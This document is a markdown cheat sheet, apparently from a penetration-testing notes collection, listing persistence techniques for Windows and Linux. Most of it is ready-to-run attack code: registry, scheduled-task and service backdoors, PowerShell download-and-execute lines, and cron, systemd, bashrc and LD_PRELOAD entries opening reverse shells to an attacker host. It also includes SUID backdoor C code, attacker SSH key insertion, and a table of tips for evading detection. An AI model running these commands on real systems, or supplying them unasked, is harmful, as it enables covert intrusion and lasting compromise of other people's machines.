# Persistence Techniques

## Table of Contents

- [Windows Persistence](#windows-persistence)
  - [Registry Run Keys](#registry-run-keys)
  - [Scheduled Tasks](#scheduled-tasks)
  - [Services](#services)
  - [Startup Folder](#startup-folder)
  - [WMI Event Subscriptions](#wmi-event-subscriptions)
  - [DLL Hijacking Persistence](#dll-hijacking-persistence)
  - [COM Hijacking](#com-hijacking)
- [Linux Persistence](#linux-persistence)
  - [Cron Jobs](#cron-jobs)
  - [SSH Keys](#ssh-keys)
  - [Systemd Services](#systemd-services)
  - [Bashrc/Profile](#bashrcprofile)
  - [SUID Binary](#suid-binary)
  - [LD_PRELOAD](#ld_preload)
- [Detection Evasion Tips](#detection-evasion-tips)
- [See Also](#see-also)

---

## Windows Persistence

### Windows Quick Check (One-liner)

```powershell
# Check common persistence locations
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run && reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run && schtasks /query /fo LIST /v | findstr /i "TaskName Status"
```

### Registry Run Keys

> Execute payload at user login

```cmd
:: Current User (HKCU)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f

:: Local Machine (HKLM) - requires admin
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f

:: RunOnce (executes once then deletes key)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```

#### PowerShell Registry Persistence

```powershell
# Set registry persistence
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\Windows\Temp\shell.exe"

# With PowerShell payload
$payload = "powershell -ep bypass -w hidden -e <BASE64>"
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value $payload
```

#### Additional Registry Locations

| Location | Description |
|----------|-------------|
| `HKCU\...\Run` | Current user login |
| `HKLM\...\Run` | All users login (admin) |
| `HKCU\...\RunOnce` | Executes once at login |
| `HKLM\...\RunOnce` | Executes once for all users |
| `HKLM\...\RunServices` | Before user login (legacy) |
| `HKCU\...\Explorer\Shell Folders\Startup` | Startup folder path |
| `HKLM\SYSTEM\CurrentControlSet\Services\<name>` | Service persistence |

---

### Scheduled Tasks

```cmd
:: Create scheduled task (runs at logon)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc ONLOGON /ru SYSTEM

:: Create scheduled task (runs every hour)
schtasks /create /tn "Maintenance" /tr "C:\Windows\Temp\shell.exe" /sc HOURLY /mo 1 /ru SYSTEM

:: Create scheduled task (runs at startup)
schtasks /create /tn "Startup" /tr "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')" /sc ONSTART /ru SYSTEM

:: Hide task by setting SD (Security Descriptor)
schtasks /create /tn "\Microsoft\Windows\Maintenance\Cleanup" /tr "C:\Windows\Temp\shell.exe" /sc DAILY /st 02:00 /ru SYSTEM
```

#### PowerShell Scheduled Task

```powershell
# Create hidden scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1'))"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Principal $principal

# List scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath
```

---

### Services

```cmd
:: Create malicious service
sc create "WindowsUpdate" binpath= "C:\Windows\Temp\shell.exe" start= auto obj= LocalSystem DisplayName= "Windows Update Service"

:: Start service
sc start WindowsUpdate

:: Query service
sc query WindowsUpdate

:: Delete service
sc delete WindowsUpdate
```

#### PowerShell Service Creation

```powershell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\Windows\Temp\shell.exe" -DisplayName "Windows Update Service" -StartupType Automatic -Description "Provides Windows Updates"
Start-Service -Name "WindowsUpdate"
```

---

### Startup Folder

```cmd
:: Current user startup folder
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"

:: All users startup folder (admin)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"
```

```powershell
# PowerShell
Copy-Item shell.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

### WMI Event Subscriptions

> Survives reboots, runs as SYSTEM

```powershell
# Create WMI event subscription
$filterName = "ProcessCreatedFilter"
$consumerName = "ProcessCreatedConsumer"
$command = "powershell -ep bypass -w hidden -e <BASE64_PAYLOAD>"

# Event Filter (triggers on any process creation)
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = $filterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'notepad.exe'"
}

# Event Consumer (action to take)
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $command
}

# Bind filter and consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

#### Remove WMI Persistence

```powershell
# Remove WMI subscription
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='ProcessCreatedFilter'" | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='ProcessCreatedConsumer'" | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -match 'ProcessCreatedFilter'} | Remove-WmiObject
```

---

### DLL Hijacking Persistence

```cmd
:: Find vulnerable DLL search order
:: Copy malicious DLL to application directory
copy malicious.dll "C:\Program Files\VulnApp\version.dll"

:: Common hijackable DLLs
:: - version.dll
:: - userenv.dll
:: - dbghelp.dll
```

---

### COM Hijacking

```cmd
:: COM hijack via registry
reg add "HKCU\SOFTWARE\Classes\CLSID\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\InProcServer32" /ve /t REG_SZ /d "C:\Windows\Temp\evil.dll" /f
reg add "HKCU\SOFTWARE\Classes\CLSID\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\InProcServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
```

---

## Linux Persistence

### Linux Quick Check (One-liner)

```shell
# Check common persistence locations
cat /etc/crontab /etc/cron.d/* 2>/dev/null; cat ~/.bashrc ~/.profile 2>/dev/null | grep -v "^#"; find /etc/systemd/system -name "*.service" -type f 2>/dev/null
```

### Cron Jobs

```shell
# User crontab (runs as current user)
(crontab -l 2>/dev/null; echo "* * * * * /tmp/shell.sh") | crontab -

# System crontab (requires root)
echo "* * * * * root /tmp/shell.sh" >> /etc/crontab

# Cron.d directory (requires root)
echo "* * * * * root /tmp/shell.sh" > /etc/cron.d/backdoor

# Every reboot
echo "@reboot root /tmp/shell.sh" >> /etc/crontab
```

#### Cron Job with Reverse Shell

```shell
# Add reverse shell to crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'") | crontab -
```

---

### SSH Keys

```shell
# Add attacker's public key to authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@kali" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# For root access (as root)
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@kali" >> /root/.ssh/authorized_keys
```

---

### Systemd Services

```shell
# Create malicious service (requires root)
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

---

### Bashrc/Profile

```shell
# Add to user's bashrc (runs on new terminal)
echo '/bin/bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1 &"' >> ~/.bashrc

# Add to profile (runs at login)
echo '/bin/bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1 &"' >> ~/.profile

# System-wide (requires root)
echo '/bin/bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1 &"' >> /etc/profile
```

---

### SUID Binary

```shell
# Copy bash and set SUID (requires root)
cp /bin/bash /tmp/.hidden_bash
chmod u+s /tmp/.hidden_bash

# Execute with -p to get root
/tmp/.hidden_bash -p

# Create SUID C wrapper
cat > /tmp/suid.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc /tmp/suid.c -o /tmp/.backdoor
chmod u+s /tmp/.backdoor
```

---

### LD_PRELOAD

```c
// preload.c - compile and set as LD_PRELOAD
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");
}
```

```shell
# Compile
gcc -shared -fPIC -o /tmp/.preload.so preload.c

# Add to ld.so.preload (requires root)
echo "/tmp/.preload.so" >> /etc/ld.so.preload
```

---

## Detection Evasion Tips

### Windows

| Technique | Evasion |
|-----------|---------|
| Registry keys | Use uncommon locations, obfuscate names |
| Scheduled tasks | Name like legitimate Windows tasks |
| Services | Use legitimate-sounding names and descriptions |
| WMI | Blends with normal WMI activity |
| Startup folder | Rename executable to look legitimate |

### Linux

| Technique | Evasion |
|-----------|---------|
| Cron jobs | Use `/etc/cron.d/` with system-like names |
| Systemd | Name service like system service |
| SSH keys | Less obvious if multiple keys exist |
| Bashrc | Hide in middle of file with obfuscation |
| SUID | Use hidden file names (`.`) |

---

## See Also

- **[Lateral Movement](5.1.Lateral-Movement.md)** - Move between machines
- **[Privilege Escalation Windows](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Escalate before persistence
- **[Privilege Escalation Linux](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Linux privesc techniques
- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - AD-specific persistence (Golden Ticket, etc.)
